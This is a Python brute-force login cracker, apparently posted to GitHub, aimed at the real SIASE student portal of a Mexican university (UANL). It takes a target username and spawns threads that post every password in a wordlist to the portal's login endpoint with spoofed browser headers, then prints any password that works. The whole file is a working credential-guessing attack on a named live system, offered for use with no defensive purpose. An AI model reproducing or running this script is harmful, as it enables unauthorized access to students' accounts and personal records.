######################################################################################################
# Title: Siase Brute force                                                                                 #
# Author: marlonsalc                                                                        #
# Github : https://github.com/marlonsalc/siase-brute-force/blob/main/bruteforce.py     
#Credits to : https://github.com/Antu7/python-bruteForce #
######################################################################################################

print (""" 

███████╗██╗ █████╗ ███████╗███████╗    ██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔════╝██║██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
███████╗██║███████║███████╗█████╗      ██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗  ██║   ██║██████╔╝██║     █████╗  
╚════██║██║██╔══██║╚════██║██╔══╝      ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
███████║██║██║  ██║███████║███████╗    ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                                                                                              

                                                      marlonsalc
""")


import threading
import requests
import time
import sys
from urllib.parse import urlencode
from bs4 import BeautifulSoup


class BruteForceCracker:
    def __init__(self, username):
        self.url = "https://deimos.dgi.uanl.mx/cgi-bin/wspd_cgi.sh/eselcarrera.htm"
        self.cuenta = username
        self.tipo = "01"
        for run in banner:
            sys.stdout.write(run)
            sys.stdout.flush()
            time.sleep(0.02)

    def crack(self, password):
        data={"HTMLTipCve": self.tipo, "HTMLUsuCve": self.cuenta, "HTMLPassword": password, "HTMLPrograma" : ""}
        
        url = f'{self.url}?{urlencode(data)}'
        headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Referer" : "https://deimos.dgi.uanl.mx/cgi-bin/wspd_cgi.sh/login.htm"
}
        response = requests.post(url, headers=headers)
        
        soup = BeautifulSoup(response.text, "html.parser")
        # if self.error_message in str(response.content):
        #     return False
        # elif "CSRF" or "csrf" in str(response.content):
        #     print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
        #     sys.exit()
        # else:
        #     print("Username: ---> " + self.username)
        #     print("Password: ---> " + password)
        #     return True
        try:
            verify = soup.title.text
            if verify == "Advertencia":
                return False
                
        except:
            print("Contraseña correcta")
            print("Username: ---> " + self.cuenta)
            print("Password: ---> " + password)
            return True
    
def crack_passwords(passwords, cracker):
    count = 0
    for password in passwords:
        count += 1
        password = password.strip()
        
        print("Trying Password: {} Time For => {}".format(count, password))
        if cracker.crack(password):
            break
def main():
    username = input("Enter Target Username: ")
    cracker = BruteForceCracker(username)
    
    with open("password.txt", "r") as f:
        chunk_size = 100
        while True:
            passwords = f.readlines(chunk_size)
            if not passwords:
                return FileNotFoundError
            t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
            t.start()

if __name__ == '__main__':
    banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""
    main()
